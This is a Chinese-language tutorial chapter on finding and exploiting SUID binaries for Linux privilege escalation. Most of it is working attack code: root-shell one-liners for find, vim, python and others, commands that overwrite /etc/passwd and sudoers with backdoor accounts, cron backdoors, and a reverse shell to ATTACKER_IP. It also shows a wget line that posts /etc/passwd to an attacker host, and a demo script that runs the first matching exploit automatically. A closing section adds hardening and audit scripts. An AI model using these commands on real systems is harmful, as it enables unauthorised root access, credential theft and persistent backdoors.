# SUID发现与利用脚本

## 章节概述

SUID（Set User ID）是 Linux 权限模型中的一种特殊机制，当可执行文件设置了 SUID 位后，用户执行该文件时将以文件所有者的身份运行。这一机制是提权攻击中最常见且最有效的向量之一。本章系统性地讲解 SUID 文件的发现、原理分析、常见可利用二进制文件的提权手法，以及自动化扫描脚本的编写，并附上 GTFOBins 参考资源。

> **核心理念**
> SUID 提权的本质是利用系统允许普通用户以 root 身份执行特定操作的设计意图。防御的核心是精确控制 SUID 文件的范围，而攻击的核心是快速识别这些文件并匹配已知的利用路径。

---

### 第1节 SUID 原理与机制

#### 1.1 SUID 位的含义

当可执行文件的权限中出现 `s` 标记时，说明该文件设置了 SUID 位。例如：

```bash
# 查看典型 SUID 文件的权限
ls -la /usr/bin/passwd
# 输出: -rwsr-xr-x 1 root root 68208 Jul 14  2023 /usr/bin/passwd
#                          ^
#                          s 表示所有者执行位设置了 SUID
```

SUID 位的生效条件：
- 文件必须是可执行的（有 `x` 权限）
- 只对二进制文件和脚本有效（对目录无意义）
- 执行时进程的有效 UID 变为文件所有者的 UID
- 通常文件所有者是 root（UID=0）

#### 1.2 SUID 与 SGID 的区别

```bash
# SUID: 以文件所有者身份运行
chmod u+s /path/to/binary    # 设置 SUID
chmod 4755 /path/to/binary   # 等效八进制写法

# SGID: 以文件所属组身份运行
chmod g+s /path/to/binary    # 设置 SGID
chmod 2755 /path/to/binary   # 等效八进制写法

# 同时设置 SUID + SGID
chmod 6755 /path/to/binary
```

#### 1.3 内核对 SUID 的处理

```bash
# 内核在 execve() 系统调用时处理 SUID/SGID
# 1. 检查文件是否有 SUID 位
# 2. 如果当前用户不是 root，将有效 UID 替换为文件所有者的 UID
# 3. 如果文件有 SGID 位，将有效 GID 替换为文件所属组的 GID
# 4. 设置进程的 saved UID/GID

# 验证进程的有效 UID
id          # 显示当前 UID/GID
whoami      # 显示当前有效用户名
cat /proc/self/status | grep -i "^euid"  # 查看有效 UID
```

---

### 第2节 SUID 文件发现方法

#### 2.1 基础 find 查找

```bash
# 查找所有 SUID 文件（系统级）
find / -perm -4000 -type f 2>/dev/null

# 查找所有 SGID 文件
find / -perm -2000 -type f 2>/dev/null

# 同时查找 SUID 和 SGID
find / -perm /6000 -type f 2>/dev/null

# 更精确的查找：只匹配 SUID 位，忽略其他权限位
find / -perm -u=s -type f 2>/dev/null
```

#### 2.2 高级 find 查找与过滤

```bash
# 按文件大小过滤（排除过大的文件）
find / -perm -4000 -type f -size -1M 2>/dev/null

# 按文件所有者过滤
find / -perm -4000 -type f -user root 2>/dev/null

# 按文件时间过滤（最近修改的 SUID 文件更可疑）
find / -perm -4000 -type f -mtime -30 2>/dev/null

# 排除特定目录
find / -perm -4000 -type f \
    -not -path "/proc/*" \
    -not -path "/sys/*" \
    -not -path "/dev/*" \
    2>/dev/null

# 输出格式化：显示文件权限和所有者
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# 输出到文件便于分析
find / -perm -4000 -type f 2>/dev/null | tee /tmp/suid_files.txt
```

#### 2.3 使用 locate 加速查找

```bash
# 更新 locate 数据库
sudo updatedb

# 从 locate 数据库中查找 SUID 文件（比 find 快）
locate -r "/.*suid.*" 2>/dev/null

# 或者用 find 结合 xargs 处理
find / -perm -4000 -type f 2>/dev/null | xargs ls -la 2>/dev/null
```

#### 2.4 使用 getcap 查找带 capability 的文件

```bash
# capability 是 SUID 的替代机制，同样可以提权
getcap -r / 2>/dev/null

# 查找特定 capability
getcap -r / 2>/dev/null | grep -i "cap_setuid"
getcap -r / 2>/dev/null | grep -i "cap_dac_override"
getcap -r / 2>/dev/null | grep -i "cap_net_admin"
```

---

### 第3节 常见 SUID 提权利用

#### 3.1 find 提权

```bash
# find 具有 -exec 参数，可以执行任意命令
# 如果 find 有 SUID 位，执行的命令也以 root 身份运行

# 方法1: 使用 -exec 执行 shell
find /tmp -exec /bin/sh -p \;

# 方法2: 使用 -exec 读取敏感文件
find /etc/shadow -exec cat {} \;

# 方法3: 使用 -exec 写入文件
find /tmp -exec touch /tmp/pwned \; -quit

# 方法4: 利用 -exec 反弹 shell
find /tmp -exec bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \;
```

#### 3.2 vim 提权

```bash
# vim 有多种提权方式

# 方法1: 直接执行 shell
vim -c ':!/bin/sh'

# 方法2: 使用 -c 参数
vim -c ':set shell=/bin/sh' -c ':shell'

# 方法3: vim 8.2+ 的 terminal 功能
vim -c ':terminal /bin/sh'

# 方法4: 读取任意文件
vim -c ':read /etc/shadow' -c ':w /tmp/shadow.txt'

# 方法5: 写入文件
vim -c ':write /etc/cron.d/backdoor' -c ':quit'
```

#### 3.3 bash 提权

```bash
# 如果 bash 有 SUID 位，直接获得 root shell
/usr/local/bin/suid_bash -p

# 或者使用 -p 参数保留特权
bash -p

# 检查 bash 是否有 SUID 位
ls -la /bin/bash /usr/bin/bash /usr/local/bin/bash 2>/dev/null
```

#### 3.4 cp 提权

```bash
# 利用 cp 的覆盖能力替换敏感文件

# 方法1: 覆盖 /etc/passwd 添加 root 用户
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' > /tmp/passwd
cp /tmp/passwd /etc/passwd

# 方法2: 覆盖 /etc/shadow（需要知道密码哈希）
cp /tmp/shadow /etc/shadow

# 方法3: 覆盖 /etc/sudoers 添加免密 sudo
echo 'attacker ALL=(ALL) NOPASSWD:ALL' > /tmp/sudoers
cp /tmp/sudoers /etc/sudoers

# 方法4: 覆盖 cron 任务文件
cp /tmp/backdoor.sh /usr/local/bin/backdoor.sh
echo '* * * * * root /usr/local/bin/backdoor.sh' > /etc/cron.d/backdoor
```

#### 3.5 nmap 提权

```bash
# 旧版 nmap（< 5.21）支持交互模式
nmap --interactive
! sh

# 新版 nmap 可以使用 --script 参数
nmap --script <script> --script-args "exec=/bin/sh"

# 使用 nmap 的 Lua 引擎执行命令
echo 'os.execute("/bin/sh")' > /tmp/script.nse
nmap --script=/tmp/script.nse localhost
```

#### 3.6 其他常见 SUID 提权

```bash
# python/python3
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# perl
perl -e 'exec "/bin/sh";'

# ruby
ruby -e 'exec "/bin/sh"'

# awk
awk 'BEGIN {system("/bin/sh")}'

# env
env /bin/sh -p

# less/more（交互式分页器）
less /etc/passwd    # 然后输入 !sh

# man（手动页查看器）
man man             # 然后输入 !sh

# ftp
ftp                  # 然后输入 !sh

# socat
socat stdin exec:/bin/sh
```

---

### 第4节 自动化 SUID 扫描脚本

#### 4.1 基础扫描脚本

```bash
#!/usr/bin/env bash
# suid_scanner.sh - SUID 文件自动化扫描工具
set -euo pipefail

readonly VERSION="1.2.0"
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

KNOWN_EXPLOITABLE=(
    "find" "vim" "vim.tiny" "vi" "nano" "bash" "sh" "zsh"
    "dash" "cp" "mv" "nmap" "nmap.old" "python" "python2" "python3"
    "perl" "ruby" "awk" "gawk" "php" "node" "lua" "env" "less"
    "more" "man" "ftp" "socat" "wget" "curl" "dd" "tar" "zip"
    "tar" "gzip" "bzip2" "xz" "strace" "ltrace" "gdb" "dmesg"
    "docker" "lxc" "runc" "pkexec" "tee" "xargs" "base64"
    "openssl" "ssh-keygen" "rsync" "screen" "tmux"
)

log_info()    { echo -e "${CYAN}[*]${NC} $*"; }
log_found()   { echo -e "${RED}[!]${NC} $*"; }
log_safe()    { echo -e "${GREEN}[+]${NC} $*"; }
log_warn()    { echo -e "${YELLOW}[~]${NC} $*"; }

banner() {
    cat << 'EOF'
  ____  _       ____ _     ___  ____
 / ___|| |     / ___| |   / _ \|  _ \
 \___ \| |    | |   | |  | | | | |_) |
  ___) | |___ | |___| |__| |_| |  __/
 |____/|_____| \____|_____\___/|_|
    SUID Scanner v1.2.0
EOF
}

scan_suid_files() {
    log_info "扫描系统中的 SUID 文件..."
    local suid_files
    suid_files=$(find / -perm -4000 -type f \
        -not -path "/proc/*" \
        -not -path "/sys/*" \
        -not -path "/dev/*" \
        2>/dev/null)

    if [[ -z "$suid_files" ]]; then
        log_safe "未发现 SUID 文件"
        return
    fi

    local count=0
    local exploit_count=0

    while IFS= read -r file; do
        ((count++))
        local basename_file
        basename_file=$(basename "$file")
        local file_owner
        file_owner=$(stat -c '%U' "$file" 2>/dev/null || echo "unknown")
        local file_perms
        file_perms=$(stat -c '%a' "$file" 2>/dev/null || echo "unknown")

        local is_exploitable=false
        for exp in "${KNOWN_EXPLOITABLE[@]}"; do
            if [[ "$basename_file" == "$exp" ]]; then
                is_exploitable=true
                break
            fi
        done

        if [[ "$is_exploitable" == true ]]; then
            log_found "可利用: $file (所有者: $file_owner, 权限: $file_perms)"
            ((exploit_count++))
        else
            log_warn "未知: $file (所有者: $file_owner, 权限: $file_perms)"
        fi
    done <<< "$suid_files"

    echo ""
    log_info "扫描完成: 共发现 $count 个 SUID 文件, 其中 $exploit_count 个已知可利用"
}

scan_capabilities() {
    log_info "扫描文件 capabilities..."
    if command -v getcap &>/dev/null; then
        getcap -r / 2>/dev/null | while IFS= read -r line; do
            log_warn "Capability: $line"
        done
    else
        log_warn "getcap 命令不可用"
    fi
}

main() {
    banner
    scan_suid_files
    echo ""
    scan_capabilities
}

main "$@"
```

#### 4.2 增强版扫描脚本（含利用建议）

```bash
#!/usr/bin/env bash
# suid_exploit_recommender.sh - SUID 扫描与利用建议生成器
set -euo pipefail

REPORT_FILE="/tmp/suid_report_$(date +%Y%m%d_%H%M%S).txt"

declare -A EXPLOIT_PATHS=(
    ["find"]="find . -exec /bin/sh -p \;"
    ["vim"]="vim -c ':!/bin/sh'"
    ["bash"]="/bin/bash -p"
    ["cp"]="echo 'root2::0:0::/root:/bin/bash' > /tmp/p && cp /tmp/p /etc/passwd"
    ["nmap"]="echo 'os.execute(\"/bin/sh\")' > /tmp/x.nse && nmap --script=/tmp/x.nse"
    ["python"]="python -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'"
    ["perl"]="perl -e 'exec \"/bin/sh\";'"
    ["ruby"]="ruby -e 'exec \"/bin/sh\"'"
    ["env"]="env /bin/sh -p"
    ["less"]="less /etc/passwd # 输入 !sh"
    ["more"]="more /etc/passwd # 输入 !sh"
    ["awk"]="awk 'BEGIN {system(\"/bin/sh\")}'"
    ["nano"]="nano # 然后 Ctrl+R 然后 Ctrl+X"
)

echo "======================================" | tee "$REPORT_FILE"
echo "  SUID 利用建议报告" | tee -a "$REPORT_FILE"
echo "  生成时间: $(date)" | tee -a "$REPORT_FILE"
echo "======================================" | tee -a "$REPORT_FILE"

find / -perm -4000 -type f 2>/dev/null | while IFS= read -r suid_file; do
    basename_file=$(basename "$suid_file")

    if [[ -v "EXPLOIT_PATHS[$basename_file]" ]]; then
        echo "" | tee -a "$REPORT_FILE"
        echo "[!] 可利用: $suid_file" | tee -a "$REPORT_FILE"
        echo "    利用命令: ${EXPLOIT_PATHS[$basename_file]}" | tee -a "$REPORT_FILE"
    fi
done

echo "" | tee -a "$REPORT_FILE"
echo "报告已保存至: $REPORT_FILE" | tee -a "$REPORT_FILE"
```

---

### 第5节 GTFOBins 参考与防御建议

#### 5.1 GTFOBins 快速查询

```bash
# GTFOBins 是 Linux/Unix 可执行文件提权的权威参考
# 网址: https://gtfobins.github.io/

# 本地查询脚本
#!/usr/bin/env bash
# gtfo_query.sh - 本地查询 GTFOBins
BINARY_NAME="${1:?用法: $0 <二进制文件名>}"

# 在线查询（需要 curl）
curl -s "https://gtfobins.github.io/gtfobins/${BINARY_NAME}/" | \
    grep -A 5 "SUID" | head -20

# 或者使用本地 clone
if [[ -d "/opt/GTFOBins" ]]; then
    grep -rl "SUID" "/opt/GTFOBins/_gtfobins/${BINARY_NAME}.md" 2>/dev/null
fi
```

#### 5.2 常见 SUID 利用速查表

```bash
# ===== 常见 SUID 提权速查 =====

# --- 文件操作类 ---
# find:     find . -exec /bin/sh -p \;
# cp:       覆盖 /etc/passwd 或 /etc/shadow
# mv:       替换系统配置文件
# tar:      tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# zip:      zip /tmp/x.zip /tmp/x -T --unzip-command="sh -c /bin/sh"
# rsync:    rsync --server --sender -vlogDtprRe.iLsFxCIvu . /  <<< 输入!/bin/sh

# --- 编辑器类 ---
# vim:      vim -c ':!/bin/sh'
# vi:       vi -c ':!/bin/sh'
# nano:     nano 然后 Ctrl+R, Ctrl+X

# --- 语言类 ---
# python:   python -c 'import os; os.execl("/bin/sh","sh","-p")'
# python3:  python3 -c 'import os; os.execl("/bin/sh","sh","-p")'
# perl:     perl -e 'exec "/bin/sh";'
# ruby:     ruby -e 'exec "/bin/sh"'
# lua:      lua -e 'os.execute("/bin/sh")'
# node:     node -e 'require("child_process").spawn("/bin/sh")'

# --- 网络工具类 ---
# nmap:     nmap --interactive 然后 !sh（旧版）
# curl:     curl -o /dev/null file:///etc/passwd
# wget:     wget --post-file /etc/passwd http://attacker/collect

# --- 系统工具类 ---
# env:      env /bin/sh -p
# strace:   strace -o /dev/null /bin/sh
# gdb:      gdb -nx -ex '!sh' -ex quit
```

#### 5.3 防御加固建议

```bash
#!/usr/bin/env bash
# suid_hardening.sh - SUID 安全加固脚本
set -euo pipefail

log_info()  { echo "[*] $*"; }
log_warn()  { echo "[!] $*"; }

remove_unnecessary_suid() {
    local files_to_check=(
        "/usr/bin/find"
        "/usr/bin/vim"
        "/usr/bin/nmap"
        "/usr/bin/python"
        "/usr/bin/perl"
        "/usr/bin/ruby"
        "/usr/bin/env"
        "/usr/bin/less"
        "/usr/bin/more"
    )

    for f in "${files_to_check[@]}"; do
        if [[ -f "$f" ]] && [[ -u "$f" ]]; then
            log_warn "移除 SUID 位: $f"
            chmod u-s "$f"
        fi
    done
}

mount_nosuid() {
    log_info "检查 nosuid 挂载选项..."
    mount | grep -v nosuid | grep -E "^/dev" | while read -r line; do
        log_warn "建议为以下分区添加 nosuid: $line"
    done
}

check_passwd_users() {
    log_info "检查 /etc/passwd 中的异常用户..."
    awk -F: '$3 == 0 && $1 != "root" {print "[!] 发现非 root 的 UID=0 用户:", $1}' /etc/passwd
}

main() {
    log_info "开始 SUID 安全加固检查..."
    remove_unnecessary_suid
    mount_nosuid
    check_passwd_users
    log_info "加固检查完成"
}

main "$@"
```

#### 5.4 审计与监控

```bash
#!/usr/bin/env bash
# suid_audit.sh - SUID 变化监控

SNAPSHOT_FILE="/var/lib/suid_snapshot.txt"

generate_snapshot() {
    find / -perm -4000 -type f 2>/dev/null | sort > /tmp/current_suid.txt
}

compare_snapshots() {
    if [[ ! -f "$SNAPSHOT_FILE" ]]; then
        echo "[!] 未找到快照文件，创建初始快照"
        cp /tmp/current_suid.txt "$SNAPSHOT_FILE"
        return
    fi

    local new_files
    new_files=$(diff "$SNAPSHOT_FILE" /tmp/current_suid.txt | grep "^>" | awk '{print $2}')

    if [[ -n "$new_files" ]]; then
        echo "[!] 发现新增 SUID 文件:"
        echo "$new_files"
    fi

    cp /tmp/current_suid.txt "$SNAPSHOT_FILE"
}

generate_snapshot
compare_snapshots
```

---

### 第6节 实战案例分析

#### 6.1 完整提权流程示例

```bash
#!/usr/bin/env bash
# suid_privesc_demo.sh - SUID 提权完整演示
set -euo pipefail

echo "===== 阶段1: 信息收集 ====="
echo "当前用户: $(whoami)"
echo "当前 UID: $(id -u)"
echo "系统信息: $(uname -a)"

echo ""
echo "===== 阶段2: SUID 文件扫描 ====="
EXPLOITABLE=()
while IFS= read -r f; do
    base=$(basename "$f")
    case "$base" in
        find|vim|vi|bash|sh|cp|nmap|python|perl|ruby|env|less|more|awk)
            echo "[!] 发现可利用 SUID: $f"
            EXPLOITABLE+=("$f")
            ;;
    esac
done < <(find / -perm -4000 -type f 2>/dev/null)

echo ""
echo "===== 阶段3: 利用路径匹配 ====="
for target in "${EXPLOITABLE[@]}"; do
    base=$(basename "$target")
    case "$base" in
        find)  echo "  $target -> find . -exec /bin/sh -p \;" ;;
        vim)   echo "  $target -> $target -c ':!/bin/sh'" ;;
        bash)  echo "  $target -> $target -p" ;;
        cp)    echo "  $target -> 覆盖 /etc/passwd" ;;
        python) echo "  $target -> $target -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'" ;;
        *)     echo "  $target -> 查询 GTFOBins: https://gtfobins.github.io/gtfobins/$base/" ;;
    esac
done

echo ""
echo "===== 阶段4: 执行利用 ====="
if [[ ${#EXPLOITABLE[@]} -gt 0 ]]; then
    FIRST="${EXPLOITABLE[0]}"
    base=$(basename "$FIRST")
    echo "[*] 尝试利用: $FIRST"
    case "$base" in
        find)  "$FIRST" -exec /bin/sh -p \; ;;
        bash)  "$FIRST" -p ;;
        vim)   "$FIRST" -c ':!/bin/sh' ;;
        *)     echo "请手动参考 GTFOBins 执行利用" ;;
    esac
else
    echo "[-] 未找到可利用的 SUID 文件"
fi
```

---

